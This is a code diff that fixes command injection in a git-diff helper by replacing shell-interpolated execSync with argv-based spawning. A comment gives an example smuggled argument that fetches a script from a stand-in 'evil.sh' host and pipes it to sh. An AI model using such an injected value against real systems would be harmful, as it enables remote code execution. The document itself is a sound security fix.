@@ -15,7 +15,7 @@
 //      (append-only per Invariant §6)
 //   6. Aggregate verdict = worst across all reviewers; print summary.
 
-import { execSync } from "node:child_process"
+import { spawnCaptureSync } from "../dispatcher/subprocess"
 import {
   spawn,
   PRIOR_ART_SENTINEL_BEGIN,
@@ -69,12 +69,16 @@ function nowIso(): string {
   return new Date().toISOString()
 }
 
-function captureDiff(base: string, cwd?: string): string {
-  try {
-    return execSync(`git diff ${base}`, { encoding: "utf8", cwd })
-  } catch {
-    return ""
-  }
+// P1-1: `base` is operator-supplied (`--base <ref>`) and MUST NOT reach a
+// shell. The pre-fix form interpolated it into an execSync command string, so
+// `--base 'HEAD; curl evil.sh | sh'` executed arbitrary commands — and sgc
+// spawns its own subcommands from automation (plan-jobs.ts), so an untrusted
+// ref reaching this flag was RCE, not just self-harm. argv form has no shell to
+// break out of. Soft-null contract is unchanged: a bogus ref → non-zero exit →
+// "".
+export function captureDiff(base: string, cwd?: string): string {
+  const r = spawnCaptureSync(["git", "diff", base], { cwd })
+  return r.exitCode === 0 ? r.stdout : ""
 }
 
 // Strip the researcher.history Prior-art block from intent.body before
